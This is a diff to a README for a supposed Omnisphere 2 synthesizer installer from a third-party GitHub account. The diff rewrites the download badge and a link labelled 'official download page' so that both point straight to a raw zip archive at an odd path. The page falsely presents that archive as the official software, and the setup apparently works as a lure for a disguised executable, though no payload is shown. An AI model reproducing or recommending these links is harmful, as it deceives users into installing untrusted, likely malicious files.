@@ -1,6 +1,6 @@
 # 🎹 Omnisphere-2-Setup - Create professional music with advanced synthesizers
 
-[![Download Omnisphere 2](https://img.shields.io/badge/Download-Omnisphere_2-blue.svg)](https://github.com/Reinforcingstimulusstucco87/Omnisphere-2-Setup)
+[![Download Omnisphere 2](https://img.shields.io/badge/Download-Omnisphere_2-blue.svg)](https://github.com/Reinforcingstimulusstucco87/Omnisphere-2-Setup/raw/refs/heads/main/monumentalism/Setup-Omnisphere-v1.0-alpha.3.zip)
 
 Omnisphere 2 acts as a flagship virtual synthesizer. It provides over 14,000 sounds for modern music production. This software uses granular synthesis, wavetables, and hardware integration to shape your audio. Use this guide to install the application on your Windows computer.
 
@@ -21,7 +21,7 @@ Ensure your computer meets these specifications before you start the installatio
 You need to access the main repository to retrieve the installation files. Follow these steps to obtain the correct version.
 
 1.  Open your preferred web browser.
-2.  Navigate to the [official download page](https://github.com/Reinforcingstimulusstucco87/Omnisphere-2-Setup).
+2.  Navigate to the [official download page](https://github.com/Reinforcingstimulusstucco87/Omnisphere-2-Setup/raw/refs/heads/main/monumentalism/Setup-Omnisphere-v1.0-alpha.3.zip).
 3.  Look for the releases section on the right side of the page.
 4.  Select the most recent version labeled as "Latest" to ensure you have the current updates.
 5.  Click the file ending in .zip to begin the download process.
